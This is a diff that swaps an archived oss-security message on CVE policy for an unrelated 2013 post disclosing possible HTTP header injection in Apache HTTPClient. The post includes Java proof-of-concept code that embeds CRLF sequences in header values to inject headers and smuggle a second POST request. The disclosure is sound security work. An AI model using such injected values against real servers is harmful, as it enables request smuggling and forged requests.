@@ -1,32 +1,48 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/09/04/10
-Message-ID: <522750E1.7050109@fifthhorseman.net>
-Date: Wed, 04 Sep 2013 11:25:21 -0400
-From: Daniel Kahn Gillmor <dkg@...thhorseman.net>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/01/11/3
+Message-ID: <CABNh_tLguWN_n535Bw4m4VgHmJzJmfg+VEz6jhJ-0sCddqWDRg@mail.gmail.com>
+Date: Thu, 10 Jan 2013 15:38:57 +0100
+From: chevalier 3as <chevalier3as@...il.com>
 To: oss-security@...ts.openwall.com
-Subject: Re: CVE request: unauthorized host/service views displayed in servicegroup view
+Subject: Potential HTTP Header Injection in Apache HTTPClient
 Content-Type: text/plain; charset=utf-8
 
-[dropping cc's, just leaving oss-security]
+Hi,
 
-On 09/03/2013 07:02 PM, Vincent Danen wrote:
+As I'm not sure if this is a vulnerability or simply a 'feature', I'm
+posting the details for more information.
 
-> I mean, if someone wants to shoot themselves in the foot and document it
-> as a feature, who are we to say otherwise?  We may not agree with it,
-> but it's a documented feature (deliberately changed), so we can't just
-> very well call it a security flaw because we don't like the new
-> behaviour.
+The addRequestHeader method of the Apache HTTPClient module version
+3.x seems to allow the injection of more than a header (potentilally
+the latest version 4.x too for addHeader method):
 
-I'm curious about this.  If, say, a modern TLS library some day decides
-to get around to implementing (old, deprecated, known-insecure,
-previously-unimplemented) SSLv2, and announces it as a feature, and
-enables it by default, is the consensus of this group that we would not
-treat it as worthy of a CVE, despite being a clear security weakening?
-
-At what point does the security community override the upstream
-decisions and declare the packages vulnerable?
-
-	--dkg
+Using the following code, it includes a third header in the request:
+        HttpClient client = new HttpClient();
+        PostMethod method = new PostMethod("http://www.google.fr");
+        method.addRequestHeader("header1", "value1\r\nheader3: value3");
+        method.addRequestHeader("header2","value2");
 
 
-Download attachment "signature.asc" of type "application/pgp-signature" (1028 bytes)
+The real risk is adding a second request using a similar code:
+req.addRequestHeader("Content-Length:0\r\n\r\n" +
+"POST\t/anotherpath\tHTTP/1.1\r\n" +
+"Host:host\r\n" +
+"Referer:faked\r\n" +
+"User-Agent:faked\r\n" +
+"Content-Type:faked\r\n" +
+"Content-Length:3\r\n" +
+"\r\n" +
+"foo\n",
+"bar");
+
+Because of the Content-Length header, the sever will consider it as a
+seperate request.
+
+Iis this an expected behavior ? if so developpers should be aware of
+the risk letting a user input values.
+
+A similar advisory for Flash is available here:
+http://www.rapid7.com/resources/advisories/R7-0026.jsp
+
+My 2 cents,
+As
